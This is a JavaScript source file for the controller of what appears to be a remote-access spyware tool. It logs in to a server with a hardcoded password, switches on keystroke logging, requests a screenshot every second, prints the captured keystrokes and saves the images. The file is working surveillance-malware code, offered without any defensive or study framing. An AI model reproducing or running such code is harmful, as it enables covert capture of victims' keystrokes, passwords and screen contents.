const { EventEmitter } = require('events')
const { Packets, PacketParser } = require('./lib/Protocol')
const Connection = require('./lib/Connection')
const UUID = require('node-machine-id').machineIdSync()

class Client {
  constructor () {
    console.log('Client init')
    this._eventEmitter = new EventEmitter()
    this._TCPclient = new Connection.TCP.Client()
    this._UDPclient = new Connection.UDP.Client()

    // {
    //   // HOOK
    //   let _writeFn = this._UDPclient.write.bind(this._UDPclient)
    //   this._UDPclient.write = (data, host, port, sendID) => {
    //     if (sendID !== false) data.id = UUID
    //     _writeFn(data, host, port)
    //   }
    // }

    this.__isAuthenticated__ = null

    let self = this
    this._TCPclient.on('payload', function (...data) {
      self._onPayload(...data, this)
    })
  }

  _onPayload (payload) {
    function parseRawData (payload) {
      let rawPacket

      try {
        rawPacket = JSON.parse(payload.toString())
      } catch (e) {
        throw Error('Packet could not be parsed')
      }

      return PacketParser(rawPacket)
    }

    try {
      let packet = parseRawData(payload)
      this._onPacket(packet)
    } catch (e) {
      // If the parse fails, just drop the payload
    }
  }

  _onPacket (packet) {
    // console.log('>RECV>', packet)

    if (packet.constructor === Packets.r_Hello) {
      let data = packet.data
      if (data) {
        if (data.status === true) {
          console.log('Authenticated with server!')
          this.__isAuthenticated__ = true

          this._UDPclient.write(Packets.Hello.create(UUID), '127.0.0.1', data.udp_port, false)

          if (this.__keepAliveLoop__) clearInterval(this.__keepAliveLoop__)

          // Register keepalive
          this.__keepAliveLoop__ = setInterval(() => {
            this._UDPclient.write(Packets.KeepAlive.create(), '127.0.0.1', data.udp_port, false)
          }, 3000)

          if (this.__onAuth) {
            this.__onAuth();
            this.__onAuth = null;
          }
        } else {
          console.log(`Authentication fail - ${data.attempts} attempts left!`)
        }
      }
    } else {
      if (this.__isAuthenticated__) {
        this._eventEmitter.emit(packet.constructor, packet)
      }
    }
  }

  connect (port, host, password, connectCallback) {
    if (connectCallback) this.__onAuth = connectCallback;
    this.__isAuthenticated__ = false
    this._TCPclient.connect(port, host, () => this.login(password))
  }

  login (password) {
    if (this.__isAuthenticated__) return
    this._TCPclient.write(Packets.Hello.create({ id: UUID, key: password }))
  }

  on (evt, func) {
    this._eventEmitter.on(evt, func.bind(this))
  }
}

var client = new Client()
client.connect(41233, '127.0.0.1', 'Hello123', function(){

  console.log("CONNECT")
  this._TCPclient.write(Packets.KeylogSetup.create({interval: 1}))
  // this._TCPclient.write(Packets.KeylogSetup.create({interval: 0}))

  setInterval(() => 
    this._TCPclient.write(Packets.Screenshot.create()),
  1000)

  this.on(Packets.r_Keylog, function(packet) {
    console.log("Received key strokes:", String.fromCharCode(...packet.data).replace(/\r/g, "\\r").replace(/\n/g, "\\n"));
  })

  this.on(Packets.r_Screenshot, function(packet) {
    console.log("Got screenshot")
    let f = require('fs')
    f.writeFileSync("recv.png", Buffer.from(packet.data.data))
    console.log(typeof packet.data);
  })
})
